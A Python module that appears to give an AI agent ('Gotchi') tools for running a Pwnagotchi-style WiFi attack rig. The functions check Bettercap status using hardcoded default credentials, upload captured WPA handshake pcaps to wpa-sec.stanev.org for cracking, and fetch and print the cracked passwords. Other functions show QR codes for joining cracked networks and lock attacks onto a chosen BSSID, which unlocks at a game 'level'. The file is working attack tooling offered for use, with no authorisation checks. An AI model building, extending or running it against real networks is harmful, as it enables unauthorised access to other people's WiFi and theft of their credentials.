import os
import requests
import glob
import re
import time
from config import PROJECT_DIR
from sdk.tool_builder import register_tool

@register_tool
def pwn_status() -> str:
    """Check the Subconscious Pwn daemon's Bettercap status and active IPC state."""
    try:
        from utils.ipc import state_manager
        state = state_manager.get_state()
        
        from requests.auth import HTTPBasicAuth
        try:
            from config import BETTERCAP_USER, BETTERCAP_PASS
        except ImportError:
            BETTERCAP_USER = "gotchi"
            BETTERCAP_PASS = "123456"

        auth = HTTPBasicAuth(BETTERCAP_USER, BETTERCAP_PASS)
        session_url = "http://localhost:8081/api/session"
        
        r = requests.get(session_url, auth=auth, timeout=3)
        if r.status_code != 200:
            # Check uptime to see if we're just booting
            try:
                with open('/proc/uptime', 'r') as f:
                    uptime = float(f.readline().split()[0])
                if uptime < 120:
                    return "Subconscious: [WARMING UP: SYNCING RADIO...]"
            except:
                pass
            return f"Bettercap API offline (Status: {r.status_code})"
        
        session = r.json()
        aps = session.get("wifi", {}).get("aps", [])
        ble_devices = session.get("ble", {}).get("devices", [])
        
        valid_aps = [ap for ap in aps if ap.get('encryption') not in ('', 'OPEN')]
        total_clients = sum([len(ap.get('clients', [])) for ap in valid_aps])
        
        handshakes = glob.glob("/root/handshakes/*.pcap")
        
        # State info
        pause_info = "Active"
        if time.time() < state.get("paused_until", 0):
            remaining = int(state["paused_until"] - time.time())
            pause_info = f"Paused for {remaining}s"
            
        target_info = state.get("target_lock") or "None"
        ble_target = state.get("ble_target") or "None"
        
        # Sort by signal strength (RSSI)
        aps_sorted = sorted(valid_aps, key=lambda x: x.get('rssi', -100), reverse=True)
        top_aps = []
        for ap in aps_sorted[:5]:
            ssid = ap.get('hostname', '<hidden>')
            rssi = ap.get('rssi', -100)
            enc = ap.get('encryption', '??')
            top_aps.append(f"  └─ {ssid} [{rssi}dBm] ({enc})")
        
        ssid_summary = "\n".join(top_aps) if top_aps else "  └─ (Scanning...)"

        return (
            f"Subconscious Tactical Status:\n"
            f"📡 WiFi:\n"
            f"• Access Points Visible: {len(valid_aps)}\n"
            f"{ssid_summary}\n"
            f"• Active Clients: {total_clients}\n"
            f"• Total Handshakes Captured: {len(handshakes)}\n"
            f"• Target Lock: {target_info}\n"
            f"🔵 Bluetooth (BLE):\n"
            f"• Devices Nearby: {len(ble_devices)}\n"
            f"• Tracking Target: {ble_target}\n"
            f"⚙️ System:\n"
            f"• Daemon State: {pause_info}\n"
            f"• Pcap Hub: /root/handshakes/"
        )
    except Exception as e:
        return f"Failed to reach Subconscious Pwn Daemon: {e}"

@register_tool
def _do_pwn_crack(pcap_path: str) -> str:
    """Uploads a .pcap file to wpa-sec.stanev.org for hash cracking."""
    from config import WPA_SEC_KEY
    if not WPA_SEC_KEY:
        return "Error: WPA_SEC_KEY not set in .env"
    if not os.path.exists(pcap_path):
        return f"Error: File not found at {pcap_path}"
    
    try:
        url = "https://wpa-sec.stanev.org/"
        cookie = {'key': WPA_SEC_KEY}
        with open(pcap_path, 'rb') as f:
            files = {'file': f}
            result = requests.post(url, cookies=cookie, files=files, timeout=30)
            result.raise_for_status()
            response = result.text.partition('\n')[0]
            return f"Upload to wpa-sec successful! Server Response: {response}"
    except Exception as e:
        return f"Failed to upload: {e}"

@register_tool
def pwn_crack(pcap_path: str) -> str:
    from src.game_engine.state import load_state
    state = load_state()
    if state.hp < 20.0:
        return f"Gotchi is too exhausted (HP: {state.hp:.1f}) to run heavy cryptographic operations. Let it rest or reboot!"
        
    import concurrent.futures
    with concurrent.futures.ProcessPoolExecutor(max_workers=1) as executor:
        return executor.submit(_do_pwn_crack, pcap_path).result()

@register_tool
def _do_pwn_check_cracks() -> str:
    """Checks wpa-sec.stanev.org for newly cracked passwords and saves them."""
    from config import WPA_SEC_KEY
    if not WPA_SEC_KEY:
        return "Error: WPA_SEC_KEY not set in .env"
        
    try:
        url = "https://wpa-sec.stanev.org/?api&dl=1"
        cookie = {'key': WPA_SEC_KEY}
        result = requests.get(url, cookies=cookie, timeout=30)
        result.raise_for_status()
        
        potfile_content = result.text.strip().split('\n')
        cracked_list = []
        handshake_dir = "/root/handshakes/"
        
        for line in potfile_content:
            if not line: continue
            parts = line.split(":")
            if len(parts) >= 4:
                bssid, station_mac, ssid = parts[0], parts[1], parts[2]
                password = ":".join(parts[3:])
                if password:
                    if os.path.exists(handshake_dir):
                        filename = re.sub(r'[^a-zA-Z0-9]', '', ssid) + '_' + bssid + '.pcap.cracked'
                        path = os.path.join(handshake_dir, filename)
                        if not os.path.exists(path):
                            with open(path, 'w') as f:
                                f.write(password)
                    cracked_list.append(f"SSID: {ssid} | BSSID: {bssid} | Pass: {password}")
                    
        if not cracked_list:
            return "No cracked passwords found on wpa-sec."
            
        return "Cracked Passwords:\n" + "\n".join(cracked_list)
    except Exception as e:
        return f"Failed to check wpa-sec: {e}"

@register_tool
def pwn_check_cracks() -> str:
    import concurrent.futures
    with concurrent.futures.ProcessPoolExecutor(max_workers=1) as executor:
        return executor.submit(_do_pwn_check_cracks).result()

@register_tool
def pwn_show_qr(ssid: str) -> str:
    """Displays a QR Code on the E-Ink screen to connect to a cracked WiFi network."""
    try:
        potfile = "/root/handshakes/wpa-sec.cracked.potfile"
        if not os.path.exists(potfile):
            return "No cracked potfile found."
            
        with open(potfile, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 4 and parts[2] == ssid:
                    password = ":".join(parts[3:])
                    from hardware.display import show_qr_code
                    show_qr_code(ssid, password, parts[0])
                    return f"QR Code for {ssid} is now displayed!"
        return f"I don't have the password for {ssid}."
    except Exception as e:
        return f"Failed to show QR: {e}"

@register_tool
def pwn_hide_qr() -> str:
    """Removes the QR Code from the E-Ink screen and restores the face."""
    try:
        from hardware.display import hide_qr_code
        hide_qr_code()
        return "QR Code hidden. Normal face restored."
    except Exception as e:
        return f"Failed to hide QR: {e}"

@register_tool
def pwn_pause(minutes: int) -> str:
    """Pauses the background Subconscious Pwn daemon for a given number of minutes."""
    try:
        from utils.ipc import state_manager
        pause_until = time.time() + (minutes * 60)
        state_manager.update_key("paused_until", pause_until)
        return f"Pwning paused for {minutes} minutes."
    except Exception as e:
        return f"Failed to pause daemon: {e}"

@register_tool
def pwn_lock_target(bssid: str) -> str:
    """Locks the Subconscious Pwn daemon to only attack a specific target BSSID. Pass empty string to clear lock."""
    from src.game_engine.state import load_state
    state = load_state()
    if state.level < 5:
        return f"Level 5 Required! You are currently Level {state.level}. Earn more XP to unlock targeted operations."
        
    try:
        from utils.ipc import state_manager
        bssid = bssid.strip().lower()
        if not bssid or bssid == "clear":
            state_manager.update_key("target_lock", None)
            return "Target lock cleared."
        state_manager.update_key("target_lock", bssid)
        return f"Target locked to BSSID: {bssid}."
    except Exception as e:
        return f"Failed to lock target: {e}"

@register_tool
def pwn_whitelist(mac_address: str) -> str:
    """Adds a MAC address to the pwning whitelist so it will never be attacked."""
    try:
        mac_address = mac_address.strip().lower()
        if not mac_address:
            return "Please provide a valid MAC address."
            
        env_file = PROJECT_DIR / ".env"
        lines = []
        if env_file.exists():
            with open(env_file, "r") as f:
                lines = f.readlines()
                
        whitelist = []
        found_line = -1
        for i, line in enumerate(lines):
            if line.startswith("PWN_WHITELIST_MACS="):
                found_line = i
                val = line.split("=", 1)[1].strip()
                if val:
                    whitelist = [m.strip().lower() for m in val.split(",")]
                break
                
        if mac_address in whitelist:
            return f"{mac_address} is already in the whitelist."
            
        whitelist.append(mac_address)
        new_val = ",".join(whitelist)
        
        if found_line >= 0:
            lines[found_line] = f"PWN_WHITELIST_MACS={new_val}\n"
        else:
            lines.append(f"PWN_WHITELIST_MACS={new_val}\n")
            
        with open(env_file, "w") as f:
            f.writelines(lines)
            
        return f"Added {mac_address} to whitelist in .env."
    except Exception as e:
        return f"Failed to whitelist: {e}"

@register_tool
def pwn_system_control(action: str) -> str:
    """
    Control the physical radio and Bettercap daemon.
    Actions: 'wifi_on' (Monitor Mode), 'wifi_off' (Managed Mode), 'bettercap_start', 'bettercap_stop'.
    """
    import subprocess
    cmd_map = {
        "wifi_on": ["gotchi", "wifi", "on"],
        "wifi_off": ["gotchi", "wifi", "off"],
        "bettercap_start": ["gotchi", "bettercap", "start"],
        "bettercap_stop": ["gotchi", "bettercap", "stop"]
    }
    
    if action not in cmd_map:
        return f"Invalid action. Use: {', '.join(cmd_map.keys())}"
        
    try:
        # Run via the unified 'gotchi' CLI wrapper
        result = subprocess.run(cmd_map[action], capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            return f"Action '{action}' executed successfully."
        else:
            return f"Action '{action}' failed: {result.stderr or result.stdout}"
    except Exception as e:
        return f"System control error: {e}"
